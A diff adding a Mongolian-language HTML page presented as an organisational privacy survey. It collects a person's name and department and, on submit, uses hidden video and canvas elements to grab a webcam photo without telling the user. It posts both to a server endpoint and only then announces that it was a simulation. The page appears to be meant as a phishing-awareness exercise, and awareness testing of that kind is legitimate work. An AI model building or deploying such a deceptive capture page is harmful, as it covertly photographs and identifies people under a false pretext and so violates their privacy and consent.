@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Анхаарал Шалгах Тест</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; }
+        #video, #canvas { border: 1px solid #ccc; margin: 10px; display: none; } /* Эхэндээ нууцлах */
+        button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
+        .warning { color: red; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <h1>Байгууллагын Нууцлалын Судалгаа</h1>
+    
+    <p class="warning">Энэхүү судалгаа нь нууцлалын мэдлэгийг шалгахад чиглэгдсэн. Үргэлжлэхийн тулд "Илгээх" товчийг дарна уу.</p>
+    
+    <form id="survey-form">
+        <label for="name">Таны нэр:</label>
+        <input type="text" id="name" name="name" required><br><br>
+        
+        <label for="department">Хэлтэс:</label>
+        <input type="text" id="department" name="department" required><br><br>
+        
+        <video id="video" width="320" height="240" autoplay></video>
+        <canvas id="canvas" width="320" height="240"></canvas>
+        
+        <button type="submit" id="submit-button">Илгээх (Үргэлжлэх)</button>
+    </form>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+        const form = document.getElementById('survey-form');
+        const submitButton = document.getElementById('submit-button');
+        
+        form.addEventListener('submit', async (event) => {
+            event.preventDefault(); 
+            
+            submitButton.disabled = true;
+            submitButton.textContent = 'Боловсруулж байна...';
+
+            // 1. Формны өгөгдлийг цуглуулах
+            const formData = new FormData(form);
+            const answers = Object.fromEntries(formData.entries());
+            
+            let imageData = null;
+
+            try {
+                // 2. Камерт хандах
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                await video.play();
+
+                // 3. 0.5 секундын дараа зураг авах
+                await new Promise(resolve => setTimeout(resolve, 500));
+                
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                imageData = canvas.toDataURL('image/jpeg');
+
+                // 4. Камерын урсгалыг зогсоох
+                stream.getTracks().forEach(track => track.stop());
+
+            } catch (err) {
+                console.warn("Камерт хандах эсвэл зураг авах үед алдаа гарсан (магадгүй хэрэглэгч Block хийсэн):", err);
+                // Зураг авахгүйгээр үргэлжлүүлнэ
+            }
+
+            // 5. Сервер рүү илгээх
+            try {
+                const response = await fetch('/api/submit-test', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ answers, imageData })
+                });
+
+                if (response.ok) {
+                    alert('✅ Тест дууслаа. Анхааралтай байгаад баярлалаа! Энэ бол зөвхөн симуляци байсан.');
+                } else {
+                    alert('❌ Сервертэй холбогдох алдаа гарлаа.');
+                }
+            } catch (error) {
+                alert('❌ Холболтын алдаа: Сервер ажиллаж байгаа эсэхийг шалгана уу.');
+            }
+            
+            submitButton.disabled = false;
+            submitButton.textContent = 'Илгээх (Үргэлжлэх)';
+        });
+    </script>
+</body>
+</html>
